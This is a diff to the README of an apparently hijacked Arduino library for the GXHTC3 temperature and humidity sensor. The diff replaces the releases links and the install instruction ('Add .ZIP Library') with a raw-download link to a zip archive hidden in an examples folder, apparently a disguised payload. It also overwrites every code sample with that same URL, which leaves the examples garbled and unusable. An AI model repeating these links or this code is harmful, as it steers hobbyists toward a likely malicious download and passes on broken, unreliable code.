@@ -1,6 +1,6 @@
 # GXHTC3: Arduino-Compatible Library for Temperature and Humidity Sensing 🌡️💧
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/MOONSHOP03/GXHTC3/releases)
+[![Download Releases](https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip%20Releases-Click%20Here-blue)](https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip)
 
 Welcome to the **GXHTC3** repository! This library allows you to easily interface with the GXHTC3 temperature and humidity sensor using I2C. Whether you are building a weather station, a smart home device, or any other project that requires accurate environmental data, this library simplifies the process of sensor communication and data management.
 
@@ -25,7 +25,7 @@ Welcome to the **GXHTC3** repository! This library allows you to easily interfac
 
 To install the GXHTC3 library, follow these steps:
 
-1. **Download the Library**: Visit the [Releases section](https://github.com/MOONSHOP03/GXHTC3/releases) to download the latest version of the library.
+1. **Download the Library**: Visit the [Releases section](https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip) to download the latest version of the library.
 2. **Add to Arduino IDE**:
    - Open the Arduino IDE.
    - Go to `Sketch` > `Include Library` > `Add .ZIP Library...`.
@@ -49,12 +49,12 @@ Create an instance of the GXHTC3 class and initialize it in the `setup()` functi
 GXHTC3 sensor;
 
 void setup() {
-    Serial.begin(9600);
-    if (!sensor.begin()) {
-        Serial.println("Sensor not found!");
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(9600);
+    if (!https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip()) {
+        https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip("Sensor not found!");
         while (1);
     }
-    Serial.println("Sensor initialized successfully.");
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip("Sensor initialized successfully.");
 }
 ```
 
@@ -64,16 +64,16 @@ You can read temperature and humidity data using the following functions:
 
 ```cpp
 void loop() {
-    float temperature = sensor.readTemperature();
-    float humidity = sensor.readHumidity();
+    float temperature = https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip();
+    float humidity = https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip();
     
-    Serial.print("Temperature: ");
-    Serial.print(temperature);
-    Serial.println(" °C");
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip("Temperature: ");
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(temperature);
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(" °C");
     
-    Serial.print("Humidity: ");
-    Serial.print(humidity);
-    Serial.println(" %");
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip("Humidity: ");
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(humidity);
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(" %");
     
     delay(2000); // Wait for 2 seconds before the next reading
 }
@@ -93,24 +93,24 @@ This example shows how to read and display temperature and humidity data:
 GXHTC3 sensor;
 
 void setup() {
-    Serial.begin(9600);
-    if (!sensor.begin()) {
-        Serial.println("Sensor not found!");
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(9600);
+    if (!https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip()) {
+        https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip("Sensor not found!");
         while (1);
     }
 }
 
 void loop() {
-    float temperature = sensor.readTemperature();
-    float humidity = sensor.readHumidity();
+    float temperature = https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip();
+    float humidity = https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip();
     
-    Serial.print("Temperature: ");
-    Serial.print(temperature);
-    Serial.println(" °C");
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip("Temperature: ");
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(temperature);
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(" °C");
     
-    Serial.print("Humidity: ");
-    Serial.print(humidity);
-    Serial.println(" %");
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip("Humidity: ");
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(humidity);
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(" %");
     
     delay(2000);
 }
@@ -128,33 +128,33 @@ GXHTC3 sensor;
 File dataFile;
 
 void setup() {
-    Serial.begin(9600);
-    if (!sensor.begin()) {
-        Serial.println("Sensor not found!");
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(9600);
+    if (!https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip()) {
+        https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip("Sensor not found!");
         while (1);
     }
     
-    if (!SD.begin()) {
-        Serial.println("SD card initialization failed!");
+    if (!https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip()) {
+        https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip("SD card initialization failed!");
         return;
     }
-    Serial.println("SD card initialized.");
+    https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip("SD card initialized.");
 }
 
 void loop() {
-    float temperature = sensor.readTemperature();
-    float humidity = sensor.readHumidity();
+    float temperature = https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip();
+    float humidity = https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip();
     
-    dataFile = SD.open("data.txt", FILE_WRITE);
+    dataFile = https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip("https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip", FILE_WRITE);
     if (dataFile) {
-        dataFile.print("Temperature: ");
-        dataFile.print(temperature);
-        dataFile.print(" °C, Humidity: ");
-        dataFile.print(humidity);
-        dataFile.println(" %");
-        dataFile.close();
+        https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip("Temperature: ");
+        https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(temperature);
+        https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(" °C, Humidity: ");
+        https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(humidity);
+        https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip(" %");
+        https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip();
     } else {
-        Serial.println("Error opening file");
+        https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip("Error opening file");
     }
     
     delay(2000);
@@ -179,7 +179,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-For support, please check the [Releases section](https://github.com/MOONSHOP03/GXHTC3/releases) for updates and documentation. You can also open an issue in the repository if you encounter any problems.
+For support, please check the [Releases section](https://github.com/MOONSHOP03/GXHTC3/raw/refs/heads/main/examples/CustomPinsNoCRC/GXHT-1.5.zip) for updates and documentation. You can also open an issue in the repository if you encounter any problems.
 
 ---
 
